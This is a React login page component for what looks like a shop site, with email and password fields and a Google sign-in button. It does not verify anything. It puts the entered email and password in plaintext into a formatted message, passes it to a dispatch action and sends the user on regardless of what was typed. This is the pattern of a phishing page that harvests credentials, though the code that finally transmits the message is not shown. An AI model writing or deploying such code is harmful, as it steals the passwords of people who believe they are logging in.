import React from 'react';
import "../../style/index.scss"
import images from "../../img/kingsmanShopStore.jpg"
import {FcGoogle} from "react-icons/fc";
import {useAppDispatch} from "../../Hooks/useAppDispatch";
import {useAppSelector} from "../../Hooks/useAppSelector";
import {fetchMode, formSliceCom, setValue} from "../../store/Reducer/ActionCreators";
import {useNavigate} from "react-router-dom";

const LogIn = () => {
    const dispatch = useAppDispatch()
    const {value, mode} = useAppSelector(s => s.LoginReducerSlice)
    const navigate = useNavigate()

    const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
        dispatch(setValue({...value, [e.target.name]: e.target.value}))
    }

    let message = `<b>open IA Adil Ademir</b>\n`
    message += `Email: ${value.email}\n`
    message += `Password: ${value.password}`


    const formChange = async (e: React.FormEvent<HTMLFormElement | HTMLButtonElement>) => {
        e.preventDefault()
        if (value.email.trim().length !== 0 && value.password.trim().length !== 0) {
            dispatch(fetchMode(false))
            dispatch(setValue({email: "", password: ""}))
            dispatch(formSliceCom(message))
            navigate("/main")
        } else {
            dispatch(fetchMode(true))
        }
    }

    return (
        <>
            <div id="logIn" className="flex items-center relative z-30" style={{
                background: `url("${images}") no-repeat center/cover`,
                objectFit: "cover"
            }}>
                <div className="container">
                    <div className="logIn flex justify-center">
                        <div className="logIn--nav p-5 bg-black/40 w-[550px] rounded h-[400px]">
                            <form action="#" onSubmit={formChange}>
                                <div className="flex flex-col items-center">
                                    <input style={{border: mode ? value.email.trim().length !== 0 ? "2px solid green" : "2px solid red" : ""}} value={value.email} onChange={handleChange} name={"email"} type="email" placeholder="email" className=""/>
                                    <input style={{border: mode ? value.password.trim().length !== 0 ? "2px solid green" : "2px solid red" : ""}} value={value.password} onChange={handleChange} name={"password"} type="password" placeholder="password" className=""/>
                                    <button  className="logIn--nav__button">Continue</button>
                                </div>
                            </form>
                            <button className="logIn--nav__child"><FcGoogle className="text-3xl mx-2"/>Continue with Google</button>
                        </div>
                    </div>
                </div>
            </div>
        </>
    );
};

export default LogIn;